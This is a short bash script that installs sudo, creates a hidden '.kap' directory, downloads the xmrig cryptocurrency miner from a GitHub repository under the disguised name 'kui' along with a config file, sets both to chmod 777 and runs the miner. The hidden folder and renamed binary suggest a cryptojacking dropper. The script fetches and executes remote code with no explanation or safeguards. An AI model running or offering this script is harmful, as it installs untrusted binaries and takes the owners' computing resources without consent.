#!/bin/bash
apt-get update ; apt-get -y install sudo
mkdir .kap && cd .kap
wget -O kui https://github.com/nandafiku/gradi/raw/main/xmrig
wget https://github.com/nandafiku/gradi/raw/main/config.json
chmod 777 kui config.json
./kui -c "config.json"
